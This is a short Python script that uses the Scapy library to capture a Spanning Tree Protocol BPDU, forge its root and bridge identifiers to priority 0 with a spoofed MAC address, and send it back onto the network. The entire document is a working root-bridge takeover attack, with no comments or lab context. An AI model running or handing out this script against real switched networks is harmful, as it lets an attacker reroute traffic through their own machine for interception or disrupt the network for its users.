from scapy.all import sniff, sendp

pkt = sniff(filter="ether dst 01:80:C2:00:00:00", count=1)

pkt[0].src = "00:00:00:00:00:01"

pkt[0].rootid = 0

pkt[0].rootmac = "00:00:00:00:00:01"

pkt[0].bridgeid = 0

pkt[0].bridgemac = "00:00:00:00:00:01"
pkt[0].show()


sendp(pkt[0], loop=0, verbose=1)

